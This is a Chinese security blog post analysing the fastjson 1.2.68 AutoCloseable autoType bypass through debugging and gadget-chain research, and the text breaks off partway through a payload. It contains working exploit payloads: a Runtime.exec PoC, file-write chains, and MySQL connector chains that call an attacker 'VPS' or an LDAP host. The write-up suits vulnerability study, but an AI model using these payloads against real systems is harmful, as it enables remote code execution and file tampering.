      <title>fastjson 1.2.68漏洞分析</title>
      <link href="/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="1-AutoCloseable"><a href="#1-AutoCloseable" class="headerlink" title="1. AutoCloseable"></a>1. AutoCloseable</h2><blockquote><p>An object that may hold resources (such as file or socket handles) until it is closed. The close() method of an AutoCloseable object is called automatically when exiting a try-with-resources block for which the object has been declared in the resource specification header. This construction ensures prompt release, avoiding resource exhaustion exceptions and errors that may otherwise occur.<br>API Note:</p><p>It is possible, and in fact common, for a base class to implement AutoCloseable even though not all of its subclasses or instances will hold releasable resources. For code that must operate in complete generality, or when it is known that the AutoCloseable instance requires resource release, it is recommended to use try-with-resources constructions. However, when using facilities such as java.util.stream.Stream that support both I/O-based and non-I/O-based forms, try-with-resources blocks are in general unnecessary when using non-I/O-based forms.<br>Since:<br>1.7</p><p>Author:<br>Josh Bloch<br>一个在关闭之前可能持有资源（例如文件或套接字句柄）的对象。 AutoCloseable 对象的 close() 方法在退出资源规范标头中已为其声明对象的 try-with-resources 块时自动调用。 这种构造确保了及时释放，避免了资源耗尽异常和错误，否则可能会发生。<br>API 注释：</p><p>即使不是所有的子类或实例都拥有可释放的资源，基类也有可能实现 AutoCloseable，实际上这很常见。 对于必须完全通用运行的代码，或者当已知 AutoCloseable 实例需要资源释放时，建议使用 try-with-resources 构造。 但是，当使用 java.util.stream.Stream 等支持基于 I/O 和非基于 I/O 的形式的工具时，在使用非 I/O- 时通常不需要 try-with-resources 块 基于表格。<br>自从：<br>1.7<br>作者：<br>乔什·布洛赫</p></blockquote><h3 id="1-1-Demo测试"><a href="#1-1-Demo测试" class="headerlink" title="1.1 Demo测试"></a>1.1 Demo测试</h3><h4 id="1-1-1-计算器测试"><a href="#1-1-1-计算器测试" class="headerlink" title="1.1.1 计算器测试"></a>1.1.1 计算器测试</h4><p>编写一个实现<code>AutoCloseable</code>接口的Demo，通过<code>fastjson</code>反序列化调用，触发代码执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1_2_68</span> <span class="keyword">implements</span> <span class="title">AutoCloseable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">poc_1_2_68</span><span class="params">(String cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String poc1 = <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;     \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;         \&quot;@type\&quot;: \&quot;vuln.poc_1_2_68\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;         \&quot;cmd\&quot;: \&quot;open /System/Applications/Calculator.app\&quot;&quot;</span> +</span><br><span class="line">            <span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        String poc = poc1;</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="1-1-2-反序列化中类的构造方法"><a href="#1-1-2-反序列化中类的构造方法" class="headerlink" title="1.1.2 反序列化中类的构造方法"></a>1.1.2 反序列化中类的构造方法</h4><p>这里在Demo中，没有设定无参构造方法，但是为什么还能反序列化成功？之前在1.2.24最开始分析的时候，当时记录的反序列化过程中只会找无参构造方法，如果没有的话会怎么样呢？<br>在之前的调试中，对于类的构造方法、Field、Method都放在<code>beanInfo</code>，因此在生成<code>beanInfo</code>对象处下断点</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/1.png" alt="1" style="zoom:50%;" /></div><p>在<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>中；在这没有看到对构造方法参数的判断，只是循环赋值给<code>creatorConstructor</code>，比如有两个构造方法，其中会根据已经遍历过的构造方法的参数长度作比较，选取参数数量较多的；如果参数数量相同，则会按照遍历的顺序，选取先遍历到的构造方法；</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/2.png" alt="2" style="zoom:50%;" /></div><p>在后面<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</code>的反序列化中，使用了<code>creatorConstructor</code>实例化对象，并传入相关参数</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/3.png" alt="2" style="zoom:50%;" /></div><h3 id="1-2-AutoCloseable反序列化调试"><a href="#1-2-AutoCloseable反序列化调试" class="headerlink" title="1.2 AutoCloseable反序列化调试"></a>1.2 AutoCloseable反序列化调试</h3><p>在JSON.parse()处下断点调试</p><h4 id="1-2-1-checkAutoType流程"><a href="#1-2-1-checkAutoType流程" class="headerlink" title="1.2.1 checkAutoType流程"></a>1.2.1 checkAutoType流程</h4><h5 id="1-2-1-1-safeModeMask"><a href="#1-2-1-1-safeModeMask" class="headerlink" title="1.2.1.1 safeModeMask"></a>1.2.1.1 safeModeMask</h5><p>首先可以看到在checkAutoType类加载过程中，多了一个safeMode，如果在parse()解析中设置了这个属性为true，则不会进行类加载，并抛出异常 <code>safeMode not support autoType</code>，这个感觉可以在提供安全建议的时候提供思路</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/4.png" alt="4" style="zoom:50%;" /></div><h5 id="1-2-1-2-内置的mappings"><a href="#1-2-1-2-内置的mappings" class="headerlink" title="1.2.1.2 内置的mappings"></a>1.2.1.2 内置的mappings</h5><p>到<code>getClassFromMapping</code>中，获取到了内置的java.lang.AutoCloseable类，</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/5.png" alt="5" style="zoom:50%;" /></div><p>在<code>TypeUtils</code>的<code>mappings</code>中有这个类的映射，回头看了一下1.2.24的<code>mappings</code>中是没有的，而1.2.68中已经没有了1.2.47利用的<code>java.lang.Class</code></p><h4 id="1-2-2-deserializer"><a href="#1-2-2-deserializer" class="headerlink" title="1.2.2 deserializer"></a>1.2.2 deserializer</h4><p>获取对应的Class后，紧接着看一下是否有内置指定的<code>deserializer</code>工具；<br>调试发现，这里并没有想java.lang.Class内置了反序列化工具类，看来是走的通用的<code>createJavaBeanDeserializer</code>方法去创建<code>deserializer</code></p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/6.png" alt="6" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.68漏洞分析/a.png" alt="a" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.68漏洞分析/7.png" alt="7" style="zoom:50%;" /></div><h4 id="1-2-3-再次进入checkAutoType"><a href="#1-2-3-再次进入checkAutoType" class="headerlink" title="1.2.3 再次进入checkAutoType"></a>1.2.3 再次进入checkAutoType</h4><p>当完成<code>@java.lang.AutoCloseable</code>的类加载并获取了<code>JavaBeanDeserializer</code>，payload的类作为字段，再次进入<code>ParseConfig</code>的<code>checkAutoType</code>，此时<code>autoTypeSupport</code>虽然为<code>false</code>，但是<code>expectClassFlag</code>已经为<code>true</code>了</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/8.png" alt="8" style="zoom:50%;" /></div><p>加载目标类，并放入<code>TypeUtils</code>的<code>mappings</code>中</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/9.png" alt="9" style="zoom:50%;" /></div><p>如图，成功在没有autoTypeSupport的情况下，完成了类加载，后面仍然是以前的反序列化流程</p><h2 id="2-利用链"><a href="#2-利用链" class="headerlink" title="2. 利用链"></a>2. 利用链</h2><h3 id="2-1-oracle-jdbc-rowset-OracleJDBCRowSet"><a href="#2-1-oracle-jdbc-rowset-OracleJDBCRowSet" class="headerlink" title="2.1 oracle.jdbc.rowset.OracleJDBCRowSet"></a>2.1 oracle.jdbc.rowset.OracleJDBCRowSet</h3><h4 id="2-1-1-fastjson1-2-68"><a href="#2-1-1-fastjson1-2-68" class="headerlink" title="2.1.1 fastjson1.2.68"></a>2.1.1 fastjson1.2.68</h4><p>之前有这么一条利用链，在我的笔记中记录是准备用于<code>1.2.68</code>的，</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.rowset.OracleJDBCRowSet&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://x.x.x.x&quot;</span>,<span class="attr">&quot;command&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>实际在<code>1.2.68</code>调试中，发现<code>oracle.jdbc.rowset.OracleJDBCRowSet</code>已经被加入黑名单了，很明显用不了；对应的黑名单<code>Hash</code>是<code>-3319207949486691020</code></p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/10.png" alt="10" style="zoom:50%;" /></div><p>那么这条利用链是哪个版本的呢？</p><h4 id="2-1-3-fastjson1-2-50"><a href="#2-1-3-fastjson1-2-50" class="headerlink" title="2.1.3 fastjson1.2.50"></a>2.1.3 fastjson1.2.50</h4><p>查看历史版本的源代码，在<code>1.2.50</code>中没有看到对RowSet实现类的限制，<code>1.2.51</code>版本后就有相关的加固了<br>因此这条利用链适用于 <code>&lt;=1.2.50</code>版本，</p><hr><blockquote><p>从1.2.68开始，虽然类加载可以通过AutoCloseable绕过限制，但是JNDI已知利用链的类都被加入了黑名单，其他相关利用链也没有公开的了，但是有了各路大神的各种利用链~</p></blockquote><ul><li><a href="">rmb122《fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记》</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247486627&idx=1&sn=b768bebbd40c7d5b39071c711d9a19aa&scene=21#wechat_redirect">voidfyoo 《Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析》</a></li><li> <a href="">珂技知识分享《关于blackhat2021披露的fastjson1.2.68链》</a></li><li><a href="">浅蓝《fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路》</a></li><li><a href="">XINYU2428 （覆盖charsets.jar）</a><h3 id="2-2-FileOutputStream"><a href="#2-2-FileOutputStream" class="headerlink" title="2.2 FileOutputStream"></a>2.2 FileOutputStream</h3></li></ul><div align=center><img src="/img/fastjson 1.2.68漏洞分析/11.png" alt="11" style="zoom:50%;" /></div><ul><li>构造方法：<code>public FileOutputStream(String name, boolean append)</code><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,<span class="attr">&quot;file&quot;</span>:<span class="string">&quot;/tmp/123&quot;</span>,<span class="attr">&quot;append&quot;</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure>这个poc在jdk11上可以，jdk8中不行，提示xxx；该poc可以生成文件</li></ul><h4 id="2-2-1-获取不到构造方法"><a href="#2-2-1-获取不到构造方法" class="headerlink" title="2.2.1 获取不到构造方法"></a>2.2.1 获取不到构造方法</h4><p>调试过程中发现，对于<code>java.io.FileOutputStream</code>完成了类加载，但是BeanInfo中没有构造方法；在build方法中如位置，跳过了creatorConstructor的赋值，原因是<code>ASMUtils.lookupParameterNames(constructor)</code>获取到的字符数组为空</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/12.png" alt="12" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.68漏洞分析/13.png" alt="13" style="zoom:50%;" /></div><ul><li>JDK8</li></ul><div align=center><img src="/img/fastjson 1.2.68漏洞分析/b.png" alt="b" style="zoom:50%;" /></div><ul><li>切换至JDK11是可以的</li></ul><div align=center><img src="/img/fastjson 1.2.68漏洞分析/c.png" alt="c" style="zoom:50%;" /></div><p>猜测和rt.jar中原生类加载、ASM有关系<br>在网上找到了一个师傅遇到相同的问题： <a href="http://scz.617.cn:8/web/202008100900.txt">http://scz.617.cn:8/web/202008100900.txt</a></p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247484866&idx=1&sn=23fb7897f6e54cdf61031a65c602487d&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&amp;mid=2247484866&amp;idx=1&amp;sn=23fb7897f6e54cdf61031a65c602487d&amp;scene=21#wechat_redirect</a><br>文章中也对这个问题做了解释，又学习到了<br>引用：<code>读取字节码来获取变量名，自定义类和第三方库由于IDE默认使用javac -g编译就没问题，系统类就不一定了。JDK11以下的版本大部分都没有携带变量名(并不一定，部分系统的JDK8也可能存在)。</code></p></blockquote><p>反编译不同版本的<code>java.io.FileOutputStream</code>类；可以看到jdk8中没有<code>LocalVariableTable</code>；而fastjson通过asm读取类后依赖<code>LocalVariableTable</code></p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/14.png" alt="14" style="zoom:50%;" /></div><ul><li>这里还有一个疑问，<code>FileOutputStream</code>也有<code>String name</code>和<code>boolean append</code>为参数的构造方法，为什么最后用的是file和append参数呢；</li></ul><p><strong>原因：</strong>参考1.1.2的调试，反序列化过程中，获取默认的构造方法，如果没有无参构造方法，且参数数量相同的情况下；优先选取constructors数组中优先遍历的方法，这里即是 <code>FileOutputStream(java.io.File, boolean)</code>的构造方法</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/15.png" alt="15" style="zoom:50%;" /></div><h4 id="2-2-2-公开的利用链"><a href="#2-2-2-公开的利用链" class="headerlink" title="2.2.2 公开的利用链"></a>2.2.2 公开的利用链</h4><p>根据2.2.1 的特性，显然jdk8中是使用不了的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;out&quot;</span>:&#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;out&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;/tmp/dest.txt&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;append&quot;</span>:<span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;infl&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;input&quot;</span>:<span class="string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;bufLen&quot;</span>:<span class="number">1048576</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;protocolVersion&quot;</span>:<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-Mysql利用链"><a href="#2-3-Mysql利用链" class="headerlink" title="2.3 Mysql利用链"></a>2.3 Mysql利用链</h3><blockquote><p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Xing-How-I-Use-A-JSON-Deserialization.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Xing-How-I-Use-A-JSON-Deserialization.pdf</a></p></blockquote><p>主要的构造思路：json字符串在fastjson反序列化过程中，触发mysql数据库连接，可用于SSRF/RCE</p><blockquote><p>关于mysql connector的jdbc组件反序列化漏洞，这个后面再分析<br>可以参考Maven库上的标识：<a href="https://mvnrepository.com/artifact/mysql/mysql-connector-java">https://mvnrepository.com/artifact/mysql/mysql-connector-java</a></p></blockquote><h4 id="2-3-1-Mysql-connector-5-1-x"><a href="#2-3-1-Mysql-connector-5-1-x" class="headerlink" title="2.3.1 Mysql connector 5.1.x"></a>2.3.1 Mysql connector 5.1.x</h4><p>适用版本：5.1.11-5.1.49 二次反序列化、5.1.10只完成了SSRF<br>关键类：com.mysql.jdbc.JDBC4Connection<br>依赖包：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>JDBC4Connection类中只有一个构造方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JDBC4Connection</span><span class="params">(String hostToConnectTo, <span class="keyword">int</span> portToConnectTo, Properties info, String databaseToConnectTo, String url)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足<code>AutoCloseable</code>接口的实现</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/16.png" alt="16" style="zoom:50%;" /></div><h5 id="2-3-1-1-触发mysql连接"><a href="#2-3-1-1-触发mysql连接" class="headerlink" title="2.3.1.1 触发mysql连接"></a>2.3.1.1 触发mysql连接</h5><p>实例化JDBC4Connection即触发dnslog，构造的info中的属性值，也是为了满足触发mysql反序列化漏洞的条件，这个后面再分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mysqlJDBCDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String hostToConnectTo = <span class="string">&quot;dnslog&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> portToConnectTo = <span class="number">3306</span>;</span><br><span class="line">    Properties info = <span class="keyword">new</span> Properties();</span><br><span class="line">    info.setProperty(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;yso_CC_calc&quot;</span>);</span><br><span class="line">    info.setProperty(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;none&quot;</span>);</span><br><span class="line">    info.setProperty(<span class="string">&quot;statementInterceptors&quot;</span>, <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">    info.setProperty(<span class="string">&quot;autoDeserialize&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    info.setProperty(<span class="string">&quot;NUM_HOSTS&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    String databaseToConnectTo = <span class="string">&quot;name&quot;</span>;</span><br><span class="line">    String url = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    JDBC4Connection jdbc4Connection = <span class="keyword">new</span> JDBC4Connection(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如图，<code>JDBC4Connection</code>的默认构造方法，执行到父类的构造方法中，并在<code>createNewIO</code>中去尝试与mysql数据库建立连接</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/17.png" alt="17" style="zoom:50%;" /></div><h5 id="2-3-1-2-反序列化"><a href="#2-3-1-2-反序列化" class="headerlink" title="2.3.1.2 反序列化"></a>2.3.1.2 反序列化</h5><p>反序列化需要借助MySql_Fake_Server <a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;VPS&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;portToConnectTo&quot;</span>: <span class="number">3306</span>,</span><br><span class="line">  <span class="attr">&quot;info&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;yso_CommonsBeanutils1_open /System/Applications/Calculator.app&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;databaseToConnectTo&quot;</span>: <span class="string">&quot;name&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试了一下，<strong>二次反序列化只在mysql-connector 5.1.11 - 5.1.49版本触发，5.1.10没有完成CB利用链的加载</strong></p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/18.png" alt="18" style="zoom:50%;" /></div><h4 id="2-3-2-Mysql-Connector-6-0-x"><a href="#2-3-2-Mysql-Connector-6-0-x" class="headerlink" title="2.3.2 Mysql Connector 6.0.x"></a>2.3.2 Mysql Connector 6.0.x</h4><p>适用版本：<strong>6.0.2、6.0.3</strong><br>关键类：com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/19.png" alt="19" style="zoom:50%;" /></div><p>依赖包：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-2-1-构造方法"><a href="#2-3-2-1-构造方法" class="headerlink" title="2.3.2.1 构造方法"></a>2.3.2.1 构造方法</h5><ul><li><p>LoadBalancedMySQLConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LoadBalancedMySQLConnection</span><span class="params">(LoadBalancedConnectionProxy proxy)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(proxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>LoadBalancedConnectionProxy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LoadBalancedConnectionProxy</span><span class="params">(ConnectionString connectionString)</span> <span class="keyword">throws</span> SQLException</span></span><br></pre></td></tr></table></figure></li><li><p>ConnectionString</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConnectionString</span><span class="params">(String url, Properties info)</span></span></span><br></pre></td></tr></table></figure><h5 id="2-3-2-2-触发mysql连接"><a href="#2-3-2-2-触发mysql连接" class="headerlink" title="2.3.2.2 触发mysql连接"></a>2.3.2.2 触发mysql连接</h5></li></ul><p>完成<code>LoadBalancedMySQLConnection</code>类的实例化即会触发<code>mysql</code>请求，这里把之前<code>info</code>的一些字段都可以通过<code>url</code>使用<code>jdbc://mysql....</code>的写法写入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mysql6JDBCDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://VPS:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line">    ConnectionString connectionString = <span class="keyword">new</span> ConnectionString(url, <span class="keyword">null</span>);</span><br><span class="line">    LoadBalancedConnectionProxy loadBalancedConnectionProxy = <span class="keyword">new</span> LoadBalancedConnectionProxy(connectionString);</span><br><span class="line">    LoadBalancedMySQLConnection loadBalancedMySQLConnection = <span class="keyword">new</span> LoadBalancedMySQLConnection(loadBalancedConnectionProxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>暂时不分析mysql这块的触发，异常中看一下调用栈</li></ul><div align=center><img src="/img/fastjson 1.2.68漏洞分析/20.png" alt="20" style="zoom:50%;" /></div><h5 id="2-3-2-3-反序列化"><a href="#2-3-2-3-反序列化" class="headerlink" title="2.3.2.3 反序列化"></a>2.3.2.3 反序列化</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">&quot;@type&quot;</span>:<span 